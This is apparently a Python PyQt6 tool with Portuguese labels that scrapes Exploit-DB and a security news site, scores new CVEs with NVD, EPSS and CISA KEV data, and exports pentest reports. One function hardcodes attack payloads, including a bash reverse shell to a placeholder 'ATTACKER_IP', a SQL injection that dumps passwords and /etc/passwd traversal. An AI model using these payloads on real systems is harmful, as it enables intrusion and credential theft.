##############################################################
#
#  CyberSpider By h00d (https://github.com/h00d-data) 
#  Sistema de busca de novas vulnerabilidades.
#
##############################################################

# ============================================================
# IMPORTS
# ============================================================
import sys
import os
import json
import re
import subprocess
import webbrowser
import requests
import feedparser
import hashlib
from datetime import datetime
import xml.etree.ElementTree as ET

import matplotlib.pyplot as plt
from docx import Document
from docx.shared import Inches

from bs4 import BeautifulSoup
from PyQt6.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QHBoxLayout,
    QLineEdit, QPushButton, QListWidget, QListWidgetItem,
    QTextEdit, QFileDialog
)
from PyQt6.QtCore import Qt, QTimer

# ============================================================
# NVD / EPSS / CISA KEV
# ============================================================
try:
    import nvdlib
except ImportError:
    nvdlib = None

# ============================================================
# CONFIGURAÇÕES
# ============================================================
EXPLOIT_FEED = "https://www.exploit-db.com/rss.xml"
CAVEIRA_URL = "https://caveiratech.com/"
CACHE_FILE = "cache.json"
NVD_API_KEY = os.getenv("NVD_API_KEY")

EPSS_API = "https://api.first.org/data/v1/epss"
CISA_KEV_URL = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"

UPDATE_INTERVAL_HOURS = 5
UPDATE_INTERVAL_MS = UPDATE_INTERVAL_HOURS * 60 * 60 * 1000

# ============================================================
# VULN CLASSIFICATION
# ============================================================
VULN_KEYWORDS = {
    "remote code execution": "Remote Code Execution",
    "rce": "Remote Code Execution",
    "sql injection": "SQL Injection",
    "sqli": "SQL Injection",
    "xss": "Cross-Site Scripting",
    "cross-site scripting": "Cross-Site Scripting",
    "lfi": "Local File Inclusion",
    "local file inclusion": "Local File Inclusion",
    "ssrf": "Server Side Request Forgery",
    "path traversal": "Path Traversal",
    "authentication bypass": "Authentication Bypass"
}

# ============================================================
# CACHE
# ============================================================
def load_cache():
    if os.path.exists(CACHE_FILE):
        try:
            with open(CACHE_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except Exception:
            data = {}
    else:
        data = {}

    data.setdefault("seen_links", [])
    data.setdefault("items", [])
    data.setdefault("exploitdb_etag", None)
    data.setdefault("exploitdb_modified", None)
    data.setdefault("caveira_hash", None)
    data.setdefault("last_update", None)
    return data

def save_cache(cache):
    with open(CACHE_FILE, "w", encoding="utf-8") as f:
        json.dump(cache, f, indent=2, ensure_ascii=False)

# ============================================================
# CLASSIFICAÇÃO / CVE
# ============================================================
def classify_vuln(text):
    text = text.lower()
    for k, v in VULN_KEYWORDS.items():
        if k in text:
            return v
    return "Unclassified / Needs Analysis"

def detect_cve(text):
    return re.findall(r"CVE-\d{4}-\d{4,7}", text, re.I)

# ============================================================
# NVD / EPSS / CISA
# ============================================================
def get_nvd_severity(cve):
    if not nvdlib:
        return "N/A", None
    try:
        res = nvdlib.searchCVE(cveId=cve, key=NVD_API_KEY) if NVD_API_KEY else nvdlib.searchCVE(cveId=cve)
        if not res:
            return "Not Found", None
        r = res[0]
        severity = getattr(r, "v31severity", None) or getattr(r, "v3severity", None)
        score = getattr(r, "v31score", None) or getattr(r, "v3score", None)
        return severity, score
    except Exception:
        return "Error", None

def get_epss(cve):
    try:
        r = requests.get(EPSS_API, params={"cve": cve}, timeout=15)
        d = r.json()["data"][0]
        return float(d["epss"]) * 100, float(d["percentile"]) * 100
    except Exception:
        return None, None

def load_cisa_kev():
    try:
        r = requests.get(CISA_KEV_URL, timeout=30)
        return {v["cveID"]: v for v in r.json()["vulnerabilities"]}
    except Exception:
        return {}

CISA_KEV_CACHE = load_cisa_kev()

# ============================================================
# ATTACK PATH
# ============================================================
def generate_attack_path(vuln_type, service_info=None, cves=None):
    return "\n".join([
        "Reconnaissance",
        f" - Superfície de ataque: {service_info or 'indefinida'}",
        "Initial Access",
        f" - Exploração via {', '.join(cves) if cves else vuln_type}",
        "Execution",
        " - Execução do vetor explorável",
        "Persistence",
        " - Webshell / backdoor",
        "Privilege Escalation",
        " - Enumeração local",
        "Lateral Movement",
        " - Pivot interno",
        "Exfiltration",
        " - Vazamento de dados"
    ])

# ============================================================
# PAYLOAD
# ============================================================
def generate_payload(vuln_type):
    payloads = {
        "Remote Code Execution": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
        "SQL Injection": "' UNION SELECT user,password FROM users--",
        "Path Traversal": "../../../../etc/passwd",
        "Local File Inclusion": "../../../../../etc/passwd",
        "Cross-Site Scripting": "<script>alert(document.domain)</script>",
        "Server Side Request Forgery": "http://127.0.0.1/admin",
        "Authentication Bypass": "admin' OR '1'='1"
    }
    return payloads.get(vuln_type, "Payload depende da brecha específica")

# ============================================================
# EXTERNAL LINKS
# ============================================================
def external_search_exact(link, cve=None):
    d = {"Página da Brecha": link}
    if cve:
        d["NVD"] = f"https://nvd.nist.gov/vuln/detail/{cve}"
        d["ExploitDB"] = f"https://www.exploit-db.com/search?cve={cve}"
        d["GitHub"] = f"https://github.com/search?q={cve}+exploit"
    return d

# ============================================================
# SPIDERS
# ============================================================
def fetch_exploitdb(cache):
    feed = feedparser.parse(
        EXPLOIT_FEED,
        etag=cache.get("exploitdb_etag"),
        modified=cache.get("exploitdb_modified")
    )

    if getattr(feed, "status", None) == 304:
        return []

    cache["exploitdb_etag"] = feed.get("etag")
    cache["exploitdb_modified"] = feed.get("modified")

    return [{"title": e.title, "link": e.link, "summary": e.summary} for e in feed.entries]

def fetch_caveiratech(cache):
    r = requests.get(CAVEIRA_URL, timeout=15)
    h = hashlib.sha256(r.text.encode()).hexdigest()

    if cache.get("caveira_hash") == h:
        return []

    cache["caveira_hash"] = h
    soup = BeautifulSoup(r.text, "html.parser")
    items = []

    for p in soup.select("article"):
        h2 = p.find("h2")
        a = p.find("a")
        if h2 and a:
            items.append({
                "title": h2.text.strip(),
                "link": a["href"],
                "summary": p.text.strip()
            })
    return items

# ============================================================
# METASPLOIT / NUCLEI
# ============================================================
def check_metasp_loit_installed():
    try:
        subprocess.run(["msfconsole", "-h"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except Exception:
        return False

def check_nuclei_installed():
    try:
        subprocess.run(["nuclei", "-h"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except Exception:
        return False

def run_metasp_loit(cve):
    return "Metasploit não instalado" if not check_metasp_loit_installed() else f"Módulo disponível para {cve}"

def run_nuclei(cve):
    return "Nuclei não instalado" if not check_nuclei_installed() else f"Template disponível para {cve}"

# ============================================================
# GUI
# ============================================================
class PentestSpider(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Pentest News Spider + Kill Chain")
        self.setFixedSize(800, 600)

        self.cache = load_cache()
        self.news = self.cache.get("items", [])
        self.selected_item = None

        layout = QVBoxLayout(self)

        self.search = QLineEdit()
        self.search.setPlaceholderText("Buscar CVE, serviço ou vulnerabilidade…")
        self.search.textChanged.connect(self.render_list)
        layout.addWidget(self.search)

        self.list = QListWidget()
        self.list.itemClicked.connect(self.show_details)
        layout.addWidget(self.list)

        self.details = QTextEdit()
        self.details.setReadOnly(True)
        layout.addWidget(self.details)

        btns = QHBoxLayout()

        self.btn_report = QPushButton("Exportar Relatório (.DOCX)")
        self.btn_report.clicked.connect(self.export_report)
        btns.addWidget(self.btn_report)

        self.btn_open = QPushButton("Abrir Link da Brecha")
        self.btn_open.clicked.connect(self.open_link)
        btns.addWidget(self.btn_open)

        layout.addLayout(btns)

        self.render_list()
        self.update_sources()

        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_sources)
        self.timer.start(UPDATE_INTERVAL_MS)

    # ========================================================
    def update_sources(self):
        items = fetch_exploitdb(self.cache) + fetch_caveiratech(self.cache)

        for s in items:
            if s["link"] in self.cache["seen_links"]:
                continue

            text = s["title"] + " " + s["summary"]
            s["type"] = classify_vuln(text)
            s["cves"] = detect_cve(text)
            s["attack_path"] = generate_attack_path(s["type"], None, s["cves"])
            s["payload"] = generate_payload(s["type"])
            s["external"] = external_search_exact(s["link"], s["cves"][0] if s["cves"] else None)
            s["metasploit"] = run_metasp_loit(s["cves"][0] if s["cves"] else "N/A")
            s["nuclei"] = run_nuclei(s["cves"][0] if s["cves"] else "N/A")

            if s["cves"]:
                cve = s["cves"][0]
                s["nvd_severity"], s["nvd_score"] = get_nvd_severity(cve)
                s["epss"], s["epss_percentile"] = get_epss(cve)
                kev = CISA_KEV_CACHE.get(cve)
                s["cisa_kev"] = "SIM" if kev else "NÃO"
                s["cisa_date"] = kev["dateAdded"] if kev else "N/A"

            self.news.insert(0, s)
            self.cache["items"] = self.news
            self.cache["seen_links"].append(s["link"])

        save_cache(self.cache)
        self.render_list()

    # ========================================================
    def render_list(self):
        self.list.clear()
        key = self.search.text().lower()
        for n in self.news:
            if key and key not in n["title"].lower():
                continue
            item = QListWidgetItem(n["title"])
            item.setData(Qt.ItemDataRole.UserRole, n)
            self.list.addItem(item)

    # ========================================================
    def show_details(self, item):
        n = item.data(Qt.ItemDataRole.UserRole)
        self.selected_item = n

        txt = f"""
TÍTULO:
{n['title']}

TIPO:
{n['type']}

CVEs:
{', '.join(n['cves']) if n['cves'] else 'N/A'}

SEVERIDADE (NVD):
{n.get('nvd_severity')} | CVSS: {n.get('nvd_score')}

EPSS:
{n.get('epss')}% | Percentil: {n.get('epss_percentile')}%

CISA KEV:
{n.get('cisa_kev')} | Data: {n.get('cisa_date')}

PAYLOAD CUSTOM:
{n['payload']}

ATTACK PATH / KILL CHAIN:
{n['attack_path']}

RECURSOS EXTERNOS:
"""
        for k, v in n["external"].items():
            txt += f"{k}: {v}\n"

        txt += f"\nMetasploit: {n['metasploit']}\nNuclei: {n['nuclei']}"
        self.details.setText(txt)

    # ========================================================
    def open_link(self):
        if self.selected_item:
            webbrowser.open(self.selected_item["link"])

    # ========================================================
    def export_report(self):
        if not self.selected_item:
            return

        n = self.selected_item
        path, _ = QFileDialog.getSaveFileName(self, "Salvar Relatório", "", "DOCX (*.docx)")
        if not path:
            return

        doc = Document()
        doc.add_heading("Pentest Attack Intelligence Report", 0)

        doc.add_heading("Resumo Executivo", level=1)
        doc.add_paragraph("Este relatório documenta uma vulnerabilidade identificada a partir de fontes públicas e análise automatizada.")

        doc.add_heading("Detalhes da Vulnerabilidade", level=1)
        doc.add_paragraph(f"Título: {n['title']}")
        doc.add_paragraph(f"CVE: {', '.join(n['cves']) if n['cves'] else 'N/A'}")
        doc.add_paragraph(f"Severidade NVD: {n.get('nvd_severity')} | CVSS: {n.get('nvd_score')}")
        doc.add_paragraph(f"EPSS: {n.get('epss')}% | Percentil: {n.get('epss_percentile')}%")
        doc.add_paragraph(f"CISA KEV: {n.get('cisa_kev')} | Data: {n.get('cisa_date')}")

        doc.add_heading("Attack Path / Kill Chain", level=1)
        doc.add_paragraph(n["attack_path"])

        if n.get("nvd_score") is not None:
            plt.figure()
            plt.bar(["CVSS", "EPSS"], [n["nvd_score"], n.get("epss") or 0])
            plt.title("Impacto x Probabilidade de Exploração")
            plt.savefig("impact.png")
            plt.close()
            doc.add_picture("impact.png", width=Inches(4))

        doc.add_heading("Conclusão", level=1)
        doc.add_paragraph("Recomenda-se correção imediata, mitigação e monitoramento contínuo.")

        doc.save(path)

# ============================================================
if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = PentestSpider()
    win.show()
    sys.exit(app.exec())
